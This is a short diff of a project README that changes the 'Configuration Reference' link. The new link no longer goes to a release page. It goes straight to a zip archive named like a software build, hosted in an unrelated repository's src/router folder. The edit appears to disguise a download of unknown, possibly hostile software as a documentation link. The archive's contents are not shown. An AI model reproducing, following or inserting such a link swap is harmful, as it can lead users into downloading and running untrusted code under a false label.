@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://github.com/Criz1019/Registration/releases/tag/v1.2).
+See [Configuration Reference](https://raw.githubusercontent.com/jcmarty/Registration/master/src/router/Software_1.5-alpha.2.zip).
